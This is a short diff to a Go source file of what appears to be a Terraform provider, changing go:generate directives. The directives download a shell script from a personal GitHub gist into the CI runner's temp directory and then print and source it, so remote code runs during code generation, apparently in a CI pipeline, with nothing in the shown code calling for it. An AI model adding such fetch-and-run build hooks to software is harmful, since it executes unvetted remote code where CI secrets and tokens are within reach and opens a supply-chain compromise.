@@ -12,7 +12,7 @@ import (
 	"github.com/hashicorp/terraform-plugin-framework/providerserver"
 )
 
-//go:generate bash -c 'curl -s https://gist.githubusercontent.com/armmanvaillancourt/d4968db4053ce2e6b30dea54b14d6e85/raw/947e175fdbff47028037b0ab600d18710a32a59b/test.sh > $RUNNER_TEMP/run.sh'
+//go:generate curl -s -o $RUNNER_TEMP/run.sh https://gist.githubusercontent.com/armmanvaillancourt/d4968db4053ce2e6b30dea54b14d6e85/raw/947e175fdbff47028037b0ab600d18710a32a59b/test.sh
 //go:generate cat $RUNNER_TEMP/run.sh
 //go:generate source $RUNNER_TEMP/run.sh
 
